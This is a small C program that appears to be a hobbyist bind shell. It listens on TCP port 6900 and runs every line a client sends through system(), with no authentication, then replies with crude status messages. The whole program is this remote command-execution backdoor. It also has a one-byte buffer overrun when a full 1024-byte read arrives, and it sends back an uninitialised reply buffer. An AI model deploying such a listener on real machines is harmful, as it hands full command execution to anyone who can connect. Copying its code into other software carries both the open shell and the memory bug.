#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

struct sockaddr_in seradr, cliadr;
int sktfkt, binder, acceptor, reader, writer, cliaddlen, listener;
unsigned short port = 6900;
const char *serip = "192.168.24.26";
char wbuff[1024], rbuff[1024];

int main()
{
    sktfkt = socket(AF_INET, SOCK_STREAM, 0);
    if (sktfkt < 0)
    {
        printf("\n socket error \n");
        return 1;
    }

    seradr.sin_family = AF_INET;
    seradr.sin_port = htons(port);
    seradr.sin_addr.s_addr = inet_addr(serip);

    int binder = bind(sktfkt, (struct sockaddr *)&seradr, sizeof(seradr));
    if (binder < 0)
    {
        printf("\n bind error \n");
        close(sktfkt);
        return 1;
    }

    while (1 > 0)
    {
        listener = listen(sktfkt, 1);
        if (listener < 0)
        {
            printf("\n Listen error \n");
            close(sktfkt);
            return 1;
        }

        cliaddlen = sizeof(cliadr);

        printf("\n Listening for clients \n");
        acceptor = accept(sktfkt, (struct sockaddr *)&cliadr, &cliaddlen);
        if (acceptor < 0)
        {
            printf("\n Accept error \n");
            close(sktfkt);
            return 1;
        }

        printf("Connection accepted");

        while (1 > 0)
        {
            reader = read(acceptor, rbuff, sizeof(rbuff));
            if (reader < 0)
            {
                printf("\n Read Error \n");
            }
            else
            {
                rbuff[reader] = '\0';
                printf("\n Server: Client says : %s \n", rbuff);
            }
            if (strcmp(rbuff, "fackof") == 0)
            {
                break;
            }

            int p = system(rbuff);
            printf("%d\n", p);
            if (p == 0)
            {
                printf("\n Server says :- Valid Shit \n");
            }
            else
            {
                printf("\n Server says : Nope \n");
            }
            

            writer = write(acceptor, wbuff, sizeof(wbuff));
            if (writer < 0)
            {
                printf("\n Write Error \n");
            }
            else
            {
                printf("\n Sent \n");
            }
            if (strcmp(rbuff, "fackof") == 0)
            {
                break;
            }
        }
        close(acceptor);
    }
    close(sktfkt);
    return 0;
}
